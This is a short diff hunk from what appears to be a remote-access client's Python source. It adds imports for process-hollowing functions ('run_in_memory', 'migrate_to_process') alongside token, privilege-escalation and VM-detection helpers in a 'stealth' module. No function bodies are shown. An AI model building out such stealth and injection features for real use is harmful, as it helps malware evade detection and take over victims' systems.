@@ -22,6 +22,10 @@ from client.modules.stealth.tokens import (
     whoami_cmd,
     enable_privilege_cmd,
 )
+from client.modules.stealth.hollowing import (
+    run_in_memory,
+    migrate_to_process,
+)
 
 
 def detect_vm():
